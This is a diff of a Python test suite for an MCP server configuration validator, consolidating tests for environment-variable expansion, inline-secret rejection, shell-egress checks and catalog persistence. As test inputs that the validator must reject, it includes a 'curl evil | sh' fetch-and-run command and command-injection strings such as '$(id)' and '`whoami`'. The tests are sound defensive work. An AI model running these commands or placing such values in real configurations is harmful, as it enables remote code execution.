@@ -22,35 +22,17 @@ from bridge.mcp.config import (
 # ${VAR} expansion
 # ---------------------------------------------------------------------------
 
-def test_expand_set_var():
+def test_expand_env_refs_set_default_and_missing():
     result = expand_env_refs("token=${MY_VAR}", {"MY_VAR": "abc"})
-    assert result.text == "token=abc"
-    assert result.missing == []
-
-
-def test_expand_default_used_when_unset():
-    result = expand_env_refs("${PORT:-8080}", {})
-    assert result.text == "8080"
-    assert result.missing == []
-
-
-def test_expand_default_ignored_when_set():
-    result = expand_env_refs("${PORT:-8080}", {"PORT": "9999"})
-    assert result.text == "9999"
-
-
-def test_expand_unset_no_default_reports_missing_and_empty():
-    result = expand_env_refs("x${SOME_FLAG}y", {})
-    assert result.text == "xy"
-    assert result.missing == ["SOME_FLAG"]
-
-
-def test_expand_multiple_refs():
-    result = expand_env_refs(
-        "${A}-${B:-fallback}-${C_TOKEN}", {"A": "1"}
-    )
+    assert result.text == "token=abc" and result.missing == []
+    # Defaults apply only when unset; unset without a default expands empty
+    # and is reported as missing.
+    result = expand_env_refs("${A}-${B:-fallback}-${C_TOKEN}", {"A": "1"})
     assert result.text == "1-fallback-"
     assert result.missing == ["C_TOKEN"]
+    assert expand_env_refs("${PORT:-8080}", {"PORT": "9999"}).text == "9999"
+    result = expand_env_refs("x${SOME_FLAG}y", {})
+    assert result.text == "xy" and result.missing == ["SOME_FLAG"]
 
 
 def test_expand_resolves_against_current_environ(monkeypatch):
@@ -72,7 +54,7 @@ def test_secret_key_heuristic():
 
 
 # ---------------------------------------------------------------------------
-# Validation: inline secrets
+# Validation
 # ---------------------------------------------------------------------------
 
 def _stdio_spec(**kwargs) -> McpServerSpec:
@@ -81,90 +63,45 @@ def _stdio_spec(**kwargs) -> McpServerSpec:
     return McpServerSpec(**base)
 
 
-def test_inline_secret_in_env_rejected():
-    spec = _stdio_spec(env={"SLACK_MCP_XOXP_TOKEN": "xoxp-1234567890abcdef"})
+def test_inline_secrets_rejected_env_refs_and_plain_values_accepted():
     with pytest.raises(McpConfigError, match="inline"):
-        spec.validate()
-
-
-def test_env_reference_for_secret_key_accepted():
-    spec = _stdio_spec(env={"SLACK_MCP_XOXP_TOKEN": "${SLACK_MCP_XOXP_TOKEN}"})
-    spec.validate()  # no raise
-
-
-def test_inline_secret_in_headers_rejected():
-    spec = McpServerSpec(
-        name="srv",
-        transport="http",
-        url="https://example.com/mcp",
-        headers={"X-Api-Key": "sk-live-0123456789"},
-    )
+        _stdio_spec(env={"SLACK_MCP_XOXP_TOKEN": "xoxp-1234567890abcdef"}).validate()
     with pytest.raises(McpConfigError, match="inline"):
-        spec.validate()
+        McpServerSpec(
+            name="srv", transport="http", url="https://example.com/mcp",
+            headers={"X-Api-Key": "sk-live-0123456789"},
+        ).validate()
+    _stdio_spec(env={"SLACK_MCP_XOXP_TOKEN": "${SLACK_MCP_XOXP_TOKEN}"}).validate()
+    _stdio_spec(env={"LOG_LEVEL": "debug"}).validate()
 
 
-def test_non_secret_literal_env_accepted():
-    spec = _stdio_spec(env={"LOG_LEVEL": "debug"})
-    spec.validate()
-
-
-# ---------------------------------------------------------------------------
-# Validation: shell egress
-# ---------------------------------------------------------------------------
-
-def test_sh_dash_c_rejected():
-    spec = _stdio_spec(command="sh", args=["-c", "curl evil | sh"])
+def test_shell_egress_rejected_clean_argv_accepted():
     with pytest.raises(McpConfigError, match="shell"):
-        spec.validate()
-
-
-def test_bash_dash_c_rejected():
-    spec = _stdio_spec(command="/bin/bash", args=["-c", "echo hi"])
+        _stdio_spec(command="sh", args=["-c", "curl evil | sh"]).validate()
     with pytest.raises(McpConfigError, match="shell"):
-        spec.validate()
-
-
-@pytest.mark.parametrize("bad_arg", ["a|b", "out>file", "in<file", "x;y", "`whoami`", "$(id)", "a&&b"])
-def test_shell_metachars_in_args_rejected(bad_arg):
-    spec = _stdio_spec(args=[bad_arg])
-    with pytest.raises(McpConfigError):
-        spec.validate()
-
-
-def test_clean_command_accepted():
+        _stdio_spec(command="/bin/bash", args=["-c", "echo hi"]).validate()
+    for bad_arg in ("a|b", "out>file", "in<file", "x;y", "`whoami`", "$(id)", "a&&b"):
+        with pytest.raises(McpConfigError):
+            _stdio_spec(args=[bad_arg]).validate()
     _stdio_spec().validate()
 
 
-def test_stdio_requires_command():
-    spec = McpServerSpec(name="srv", transport="stdio", command=None)
+def test_stdio_requires_command_and_unknown_transport_rejected():
     with pytest.raises(McpConfigError, match="command"):
-        spec.validate()
-
-
-def test_unknown_transport_rejected():
-    spec = McpServerSpec(name="srv", transport="carrier-pigeon")
+        McpServerSpec(name="srv", transport="stdio", command=None).validate()
     with pytest.raises(McpConfigError, match="transport"):
-        spec.validate()
+        McpServerSpec(name="srv", transport="carrier-pigeon").validate()
 
 
 # ---------------------------------------------------------------------------
 # Catalog load/save
 # ---------------------------------------------------------------------------
 
-def test_missing_file_is_silent_noop(tmp_path):
-    catalog = load_catalog(tmp_path / "does-not-exist.json")
-    assert catalog.specs == {}
-
-
-def test_malformed_json_is_tolerated(tmp_path):
+def test_load_catalog_tolerates_missing_malformed_and_invalid_entries(tmp_path):
+    assert load_catalog(tmp_path / "does-not-exist.json").specs == {}
     path = tmp_path / "mcp.json"
     path.write_text("{not json", encoding="utf-8")
-    catalog = load_catalog(path)
-    assert catalog.specs == {}
-
-
-def test_invalid_server_entry_skipped_not_fatal(tmp_path):
-    path = tmp_path / "mcp.json"
+    assert load_catalog(path).specs == {}
     path.write_text(json.dumps({
         "version": 1,
         "servers": {
@@ -174,25 +111,16 @@ def test_invalid_server_entry_skipped_not_fatal(tmp_path):
     }), encoding="utf-8")
     catalog = load_catalog(path)
     assert set(catalog.specs) == {"good"}
-
-
-def test_defaults_applied(tmp_path):
-    path = tmp_path / "mcp.json"
-    path.write_text(json.dumps({
-        "version": 1,
-        "servers": {"srv": {"transport": "stdio", "command": "npx"}},
-    }), encoding="utf-8")
-    spec = load_catalog(path).specs["srv"]
-    assert spec.enabled is True
-    assert spec.scope == "user"
-    assert spec.trust == "standard"
-    assert spec.tier == "warm"
-    assert spec.connect_timeout_s == 30
-    assert spec.call_timeout_s == 120
+    # Defaults: enabled, user scope, standard trust (permission prompts),
+    # warm tier (schema withheld), long timeouts, every tool included.
+    spec = catalog.specs["good"]
+    assert spec.enabled is True and spec.scope == "user"
+    assert spec.trust == "standard" and spec.tier == "warm"
+    assert spec.connect_timeout_s == 30 and spec.call_timeout_s == 120
     assert spec.tools_include == ["*"]
 
 
-def test_unknown_keys_preserved_on_rewrite(tmp_path):
+def test_unknown_keys_preserved_on_rewrite_and_save_is_atomic(tmp_path):
     original = {
         "version": 1,
         "future_top_level": {"a": 1},
@@ -213,6 +141,7 @@ def test_unknown_keys_preserved_on_rewrite(tmp_path):
     src.write_text(json.dumps(original), encoding="utf-8")
     catalog = load_catalog(src)
     dst = tmp_path / "out.json"
+    dst.write_text("old", encoding="utf-8")  # replaced, not appended to
     save_catalog(catalog, dst)
 
     rewritten = json.loads(dst.read_text(encoding="utf-8"))
@@ -227,14 +156,8 @@ def test_unknown_keys_preserved_on_rewrite(tmp_path):
     # No stray tmp files left behind by the atomic write.
     leftovers = [p.name for p in tmp_path.iterdir() if p.name.startswith(".mcp-json-")]
     assert leftovers == []
-
-
-def test_save_catalog_atomic_replaces_existing(tmp_path):
-    dst = tmp_path / "mcp.json"
-    dst.write_text("old", encoding="utf-8")
     save_catalog(McpCatalog(), dst)
-    doc = json.loads(dst.read_text(encoding="utf-8"))
-    assert doc == {"version": 1, "servers": {}}
+    assert json.loads(dst.read_text(encoding="utf-8")) == {"version": 1, "servers": {}}
 
 
 def test_project_scope_behind_flag(tmp_path):
@@ -281,7 +204,7 @@ def test_mcpservers_alias_accepted(tmp_path):
     assert load_catalog(both).specs["a"].command == "native"
 
 
-def test_claude_code_camelcase_oauth_block_normalized():
+def test_oauth_block_camelcase_normalized_and_explicit_auth_wins():
     # Shape shipped by slackapi/slack-skills-plugin's .mcp.json.
     spec = McpServerSpec.from_dict("slack", {
         "type": "http",
@@ -300,9 +223,7 @@ def test_claude_code_camelcase_oauth_block_normalized():
         "scope": "a b",
         "redirect_host": "localhost",
     }
-
-
-def test_snake_case_oauth_block_untouched_and_explicit_auth_wins():
+    # snake_case blocks are left untouched and an explicit auth is respected.
     spec = McpServerSpec.from_dict("s", {
         "transport": "http", "url": "https://x.example/mcp", "auth": "none",
         "oauth": {"client_id": "abc", "redirect_port": 0, "redirect_host": "127.0.0.1"},
@@ -311,7 +232,7 @@ def test_snake_case_oauth_block_untouched_and_explicit_auth_wins():
     assert spec.oauth == {"client_id": "abc", "redirect_port": 0, "redirect_host": "127.0.0.1"}
 
 
-def test_tools_allow_quarantined_round_trips(tmp_path):
+def test_tools_allow_quarantined_round_trips():
     spec = McpServerSpec.from_dict("s", {
         "command": "python3", "args": ["-c", "pass"],
         "tools": {"allow_quarantined": ["shady", "other"]},
